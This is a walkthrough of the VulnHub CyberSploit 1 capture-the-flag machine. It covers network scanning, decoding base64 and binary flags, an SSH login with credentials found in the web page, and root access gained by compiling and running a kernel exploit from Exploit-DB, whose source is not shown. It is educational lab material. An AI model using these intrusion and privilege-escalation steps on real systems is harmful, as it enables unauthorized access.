---
title: "CyberSploit 1 Walkthrough"
date: 2024-07-29
author: Nijith Wilson
categories: [CTF, VulnHub]
tags: [exploitation, privilege escalation, binary decoding]
thumbnail: ![CyberSploit 1 Thumbnail](https://media.licdn.com/dms/image/D5612AQGguzxgpRqeMg/article-cover_image-shrink_720_1280/0/1684129320616?e=2147483647&v=beta&t=leTcbamPsrsEZmLy16Gx6d2PVWMrlz-n2xTLOViwK5E)
---

![alt text](https://media.licdn.com/dms/image/D5612AQGguzxgpRqeMg/article-cover_image-shrink_720_1280/0/1684129320616?e=2147483647&v=beta&t=leTcbamPsrsEZmLy16Gx6d2PVWMrlz-n2xTLOViwK5E)


### Description

  

This walkthrough will guide you through exploiting the **CyberSploit 1** virtual machine available on VulnHub. Designed for beginners, this machine aims to teach about encoder-decoder techniques and Exploit-DB through the capture of three flags.

  

- **Filename:** [cybersploit.ova](https://download.vulnhub.com/cybersploit/cybersploit.ova)

- **Operating System:** Linux

- **File size:** 1.4 GB

  

### Table of Contents

  

1. **Identify IP Address**

2. **Enumeration – TCP Port Scanning**

3. **Enumeration – Web Server Port 80**

- **Flag 1 – Robots.txt**

- **Enumeration – Username – HTML Source**

4. **SSH Login**

- **Flag 2 – User Home**

5. **Privilege Escalation – User to Root**

- **Flag 3 – Root Home**

6. **Other Information**

  

### Walkthrough

  

**1. Identify IP Address**

  

After importing the `cybersploit.ova` file into your virtualization software, ensure both the CyberSploit VM and your attacker machine (Kali Linux) are on the same network. Identify the IP address of the CyberSploit machine using an ARP scanner like `arp-scan -l`:

  

```bash

┌──(root㉿neo)-[~]

└─# arp-scan -l

Interface: wlan0, type: EN10MB, MAC: 50:c2:e8:43:93:3b, IPv4: 192.168.1.8

Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)

192.168.1.6 08:00:27:1f:ef:a6 PCS Systemtechnik GmbH

  

13 packets received by filter, 0 packets dropped by kernel

Ending arp-scan 1.10.0: 256 hosts scanned in 2.032 seconds (125.98 hosts/sec). 1 responded

```

  

**2. Enumeration – TCP Port Scanning**

  

Scan the identified IP address for open ports and services using Nmap:

  

```bash

┌──(root㉿neo)-[~]

└─# nmap -A 192.168.1.6

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-13 11:49 IST

Nmap scan report for cybersploit-CTF.bbrouter (192.168.1.6)

Host is up (0.00042s latency).

Not shown: 998 closed tcp ports (reset)

PORT STATE SERVICE VERSION

22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey:

| 1024 01:1b:c8:fe:18:71:28:60:84:6a:9f:30:35:11:66:3d (DSA)

| 2048 d9:53:14:a3:7f:99:51:40:3f:49:ef:ef:7f:8b:35:de (RSA)

|_ 256 ef:43:5b:d0:c0:eb:ee:3e:76:61:5c:6d:ce:15:fe:7e (ECDSA)

80/tcp open http Apache httpd 2.2.22 ((Ubuntu))

|_http-title: Hello Pentester!

|_http-server-header: Apache/2.2.22 (Ubuntu)

MAC Address: 08:00:27:1F:EF:A6 (Oracle VirtualBox virtual NIC)

Device type: general purpose

Running: Linux 3.X|4.X

OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4

OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16

Network Distance: 1 hop

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  

TRACEROUTE

HOP RTT ADDRESS

1 0.42 ms cybersploit-CTF.bbrouter (192.168.1.6)

  

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 8.05 seconds

```

  

**3. Enumeration – Web Server Port 80**

  

Explore the web server running on port 80:

  

```bash

┌──(root㉿neo)-[~]

└─# nmap -p80 192.168.1.6 --script=http-enum* -sV

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-13 12:09 IST

Nmap scan report for cybersploit-CTF.bbrouter (192.168.1.6)

Host is up (0.00051s latency).

  

PORT STATE SERVICE VERSION

80/tcp open http Apache httpd 2.2.22 ((Ubuntu))

|_http-server-header: Apache/2.2.22 (Ubuntu)

| http-enum:

|_ /robots.txt: Robots file

MAC Address: 08:00:27:1F:EF:A6 (Oracle VirtualBox virtual NIC)

  

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 6.91 seconds

```

  

In the output above:

  

- **Port 80 (HTTP)**: The scan reveals that port 80 is open and running an Apache HTTP server (`Apache httpd 2.2.22`) on an Ubuntu system. The `http-server-header` confirms the Apache version.

  

- **http-enum Script**: The `http-enum` Nmap script was used (`--script=http-enum*`) during the scan, which is designed to enumerate information from web servers. In this case, it identified a `robots.txt` file.

  

- **robots.txt**: The `http-enum` script found and reported the presence of a `robots.txt` file, indicating that there might be additional directories or files specified in this file that are intended to be excluded from search engine crawlers.

  

Now, proceed to investigate the contents of the `robots.txt` file to discover any hidden directories or files that could be of interest.

  

```bash

┌──(root㉿neo)-[~]

└─# curl 192.168.1.6/robots.txt

R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9

```

  

Decode the base64-encoded content retrieved from `robots.txt` to reveal additional information:

  

```bash

┌──(root㉿neo)-[~]

└─# echo "R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9" | base64 --decode

Good Work !

Flag1: cybersploit{youtube.com/c/cybersploit}

```

  

Next, check the HTML source for potential usernames:

  

```bash

┌──(root㉿neo)-[~]

└─# curl 192.168.1.6

<!doctype html>

<html lang="en">

<head>

<!-- Required meta tags -->

<meta charset="utf-8">

<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

<!-- Bootstrap CSS -->

<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj

  

7Sk" crossorigin="anonymous">

  

<title>Hello Pentester!</title>

</head>

<body>

<h1>Welcome To CyBeRSplOiT-CTF </h1>

<nav class="navbar navbar-expand-lg navbar-light bg-dark">

<a class="navbar-brand" href="#">Home</a>

<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">

<span class="navbar-toggler-icon"></span>

</button>

<div class="collapse navbar-collapse" id="navbarNav">

<ul class="navbar-nav">

<li class="nav-item active">

<a class="nav-link" href="#">Pentester<span class="sr-only">(current)</span></a>

</li>

<li class="nav-item">

<a class="nav-link" href="#">Web Developer</a>

</li>

<li class="nav-item">

<a class="nav-link" href="#">Android Developer</a>

</li>

</ul>

</div>

</nav>

<!-- Optional JavaScript -->

<!-- jQuery first, then Popper.js, then Bootstrap JS -->

<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>

<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>

<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>

<pre> <img src="hacker.gif" class="img-fluid" alt="hacker">

</pre>

<pre>

<h4> LOL ! hahahhahahhahaha..............<h4>

<h5> You should try something more ! <h5>

</pre>

  

<!-------------username:itsskv--------------------->

</body>

</html>

```

  

**4. SSH Login**

  

Use the discovered credentials to gain SSH access to the machine:

  

- Username: `itsskv`

- Password: `cybersploit{youtube.com/c/cybersploit}`

  

```bash

┌──(root㉿neo)-[~]

└─# ssh itsskv@192.168.1.6

itsskv@192.168.1.6's password:

Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-32-generic i686)

  

* Documentation: https://help.ubuntu.com/

  

332 packages can be updated.

273 updates are security updates.

  

New release '14.04.6 LTS' available.

Run '

  

do-release-upgrade' to upgrade to it.

  

Your Hardware Enablement Stack (HWE) is supported until April 2017.

  

Last login: Mon Apr 8 20:09:36 2024 from neo.bbrouter

itsskv@cybersploit-CTF:~$

```

  

Flag 2 – User Home

  

```bash

itsskv@cybersploit-CTF:~$ ls

Desktop Documents Downloads examples.desktop flag2.txt Music Pictures Public Templates Videos

itsskv@cybersploit-CTF:~$ cat flag2.txt

01100111 01101111 01101111 01100100 00100000 01110111 01101111 01110010 01101011 00100000 00100001 00001010 01100110 01101100 01100001 01100111 00110010 00111010 00100000 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 01111011 01101000 01110100 01110100 01110000 01110011 00111010 01110100 00101110 01101101 01100101 00101111 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 00110001 01111101

itsskv@cybersploit-CTF:~$

```

We have found second flag as some compinations on 0101 it represents binary. Lets try to decrypt it by using online website. - **Cryptii:** Binary decoder tool. [Cryptii Binary Decoder](https://cryptii.com/pipes/binary-decoder)

  

![Screenshot from 2024-04-13 12-50-26](https://github.com/f141ne0/f141ne0.github.io/assets/165682600/ae8cd8be-f860-4b72-a65b-b23ea35e0d2f)

  
  

**5. Privilege Escalation – User to Root**

  

To elevate privileges to the `root` user and locate the final flag, we first checked the kernel version using the command `uname -a`:

  

```bash

itsskv@cybersploit-CTF:~$ uname -a

Linux cybersploit-CTF 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux

```

- `uname -a`: Displays system information, including the kernel version.

  

With this information, we then searched for potential exploits on Exploit-DB using `searchsploit` to identify a suitable exploit. The search led us to an exploit applicable to the Linux kernel version `3.13.0`.

  

![Screenshot from 2024-04-13 13-02-29](https://github.com/f141ne0/f141ne0.github.io/assets/165682600/a3054dc5-dc99-47aa-9d10-a2a2c5413709)

  
  

We copied the exploit code and saved it in the `/tmp` directory as `exploit.c`.

  

```bash

itsskv@cybersploit-CTF:/tmp$ nano exploit.c

```

  

Choosing the `/tmp` directory for this purpose is strategic because it typically has permissions that allow for file creation and execution by users, making it a common location for staging files during exploitation.

  

After saving the exploit code, we compiled it using `gcc` and granted execution permissions to the resulting binary file using `chmod +x`:

  

```bash

itsskv@cybersploit-CTF:/tmp$ gcc exploit.c -o exploit

itsskv@cybersploit-CTF:/tmp$ chmod +x exploit

```

- `gcc exploit.c -o exploit`: Compiles the C source code (`exploit.c`) into an executable named `exploit`.

- `chmod +x exploit`: Grants execute permissions to the compiled exploit binary.

  

Executing the compiled exploit triggered the exploitation process, which involved spawning threads, mounting, and creating necessary files such as `/etc/ld.so.preload` and a shared library, ultimately granting us `root` access:

  

```bash

itsskv@cybersploit-CTF:/tmp$ ./exploit

spawning threads

mount #1

mount #2

child threads done

/etc/ld.so.preload created

creating shared library

#

```

- `./exploit`: Executes the compiled exploit, triggering the privilege escalation process.

  

With `root` access achieved, we navigated to the `/root` directory to locate and read the final flag:

  

```bash

# cd /root

# ls

finalflag.txt

# cat finalflag.txt

______ ____ ____ .______ _______ .______ _______..______ __ ______ __ .___________.

/ |\ \ / / | _ \ | ____|| _ \ / || _ \ | | / __ \ | | | |

| ,----' \ \/ / | |_) | | |__ | |_) | | (----`| |_) | | | | | | | | | `---| |----`

| | \_ _/ | _ < | __| | / \ \ | ___/ | | | | | | | | | |

| `----. | | | |_) | | |____ | |\ \----.----) | | | | `----.| `--' | | | | |

\______| |__| |______/ |_______|| _| `._____|_______/ | _| |_______| \______/ |__| |__|

  

_ _ _ _ _ _ _ _ _ _ _ _ _ _ _

/ \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \

( c | o | n | g | r | a | t | u | l | a | t | i | o | n | s )

\_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/

  

flag3: cybersploit{Z3X21CW42C4 many many congratulations !}

  

if you like it share with me https://twitter.com/cybersploit1.

  

Thanks !

#

```

  

We successfully located the final flag (`flag3`) in the `/root` directory and extracted it, obtaining the message:

  

```

flag3: cybersploit{Z3X21CW42C4 many many congratulations !}

```

  
  

By following these steps and understanding each command's purpose, you can gain valuable insights into the process of privilege escalation and exploit execution. Enjoy your exploration of cybersecurity!